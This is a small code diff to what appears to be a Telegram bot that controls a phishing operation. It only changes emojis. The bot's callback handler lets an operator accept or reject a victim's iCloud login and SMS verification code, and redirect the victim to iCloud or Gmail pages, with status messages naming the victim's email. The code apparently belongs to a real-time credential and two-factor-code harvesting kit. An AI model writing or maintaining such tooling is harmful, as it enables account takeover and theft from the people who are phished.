@@ -312,9 +312,9 @@ bot.on("callback_query", async (query) => {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
         console.log(`❌ PAGE_REJECT matched! Message: ${statusMessage}`);
       } else if (action === "sms_accept") {
-        statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
+        statusMessage = `💬 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
+        statusMessage = `💬 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
